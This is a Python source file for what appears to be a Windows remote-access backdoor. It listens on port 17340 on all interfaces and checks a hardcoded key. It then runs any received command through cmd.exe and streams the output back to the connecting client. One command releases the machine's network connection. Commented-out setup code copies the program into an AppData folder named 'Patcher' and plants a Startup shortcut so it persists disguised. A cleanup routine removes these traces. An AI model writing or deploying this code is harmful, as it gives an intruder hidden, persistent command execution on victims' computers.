import os
import socket
import subprocess
import sys
import time

privateKey: str = "?!(asLK03,,yB/["
sys.stderr = sys.stdout
running: bool = True # running server
finished: bool = False # finished running commands this session
sock: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port: int = 17340
try:
    sock.bind(("0.0.0.0", port))
except:
    exit(1)
sock.listen(5)
print("Socket Created and Listening . . . ")

def clientConnect():
    global finished
    finished = False
    print("Waiting for Connection . . . ")
    client, address = sock.accept()
    print("Connection Created with " + str(address))
    try:
        commandHandler(client)
        client.send("\nConnection Closed".encode())
        time.sleep(1)
        client.close()
    except:
        print("Connection Interrupted")
        pass
    print("Connection Closed")
    time.sleep(1)
    if running == True:
        clientConnect()

def commandHandler(client: socket.socket):
    global finished
    try:
        client.send(("\n\nCurrent Directory: " + os.getcwd()).encode())
        time.sleep(.25)
        client.send("Command".encode())
        command: str = client.recv(1024).decode().strip()
        if (command.startswith(privateKey)):
            command = command.removeprefix(privateKey + " ")
            if (command == "Finish"):
                finished = True
            if (not finished):
                runCommand(command, client)
                if (running):
                    commandHandler(client)
        else:
            client.send("Invalid Key".encode())
    except:
        print("Connection Interrupted")
        pass

def runCommand(command: str, client: socket.socket):
    global running
    global finished
    if ("cd " in command):
        command = command.removeprefix("cd ")
        os.chdir(command)
    else:
        if (command == "Disconnect"):
            print("Internet Released")
            subprocess.Popen("cmd.exe /c ipconfig /release >nul 2>&1")
            time.sleep(5)
            subprocess.Popen("cmd.exe /c ipconfig /release >nul 2>&1")
            time.sleep(5)
            subprocess.Popen("cmd.exe /c ipconfig /renew >nul 2>&1")
            print("Internet Renewed")
        elif (command == "Terminate"):
            print("Terminating")
            running = False
            finished = True
        else:
            prefixCommand = "cmd.exe /c "
            command = prefixCommand + command.strip()
            print("Running " + command)
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            client.send("Output: ".encode())
            while True:
                line = process.stdout.readline()
                if not line:
                    break
                print(line)
                time.sleep(0.001)
                client.send(line)
            client.send("\nErrors: ".encode() )
            while True:
                line = process.stderr.readline()
                if not line:
                    break
                client.send(line.strip())

clientConnect()



# def firstSetup():
#     shell = win32com.client.Dispatch("WScript.Shell")
#     targetPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Patcher"
#     startupPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
#     try:
#         if (not os.path.isdir(targetPath)):
#             os.mkdir(targetPath)
#         if (not os.path.isdir(targetPath + "/dist")):
#             head, tail = os.path.split(sys.argv[0])
#             shutil.copytree(head, (targetPath + "/dist"))
#             shortcut = shell.CreateShortCut(targetPath + "/dist/Server.lnk")
#             shortcut.Targetpath = targetPath + "/dist/Server.exe"
#             shortcut.save()
#             shutil.copy(targetPath + "/dist/Server.lnk", startupPath)
#     except:
#         print("Setup Unsuccessful")
#         pass

# def lastSetdown():
#     targetPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Patcher/dist"
#     startupPath: str = "C:/Users/"+os.getlogin()+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Server.lnk"
#     try:
#         subprocess.Popen("cmd.exe /c del " + startupPath)
#         subprocess.Popen("cmd.exe /c rd " + targetPath + " /s /q")
#     except:
#         pass
